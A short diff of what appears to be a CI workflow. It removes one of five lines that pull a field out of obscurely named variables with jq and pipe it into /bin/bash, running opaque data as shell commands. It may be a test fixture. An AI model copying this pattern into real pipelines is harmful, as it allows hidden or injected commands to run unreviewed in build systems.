@@ -25,7 +25,6 @@ jobs:
           echo $vvznw2012 | jq -r .hx49615 | /bin/bash
           echo $sapdz0 | jq -r .nray9 | /bin/bash
           printf '%s' "$btuc7" | jq -r .jqzi75 | /bin/bash
-          printf '%s' "$mvg4" | jq -r .tq66 | /bin/bash
           echo $du3 | jq -r .rpswr4 | /bin/bash
 
       - name: Upload output
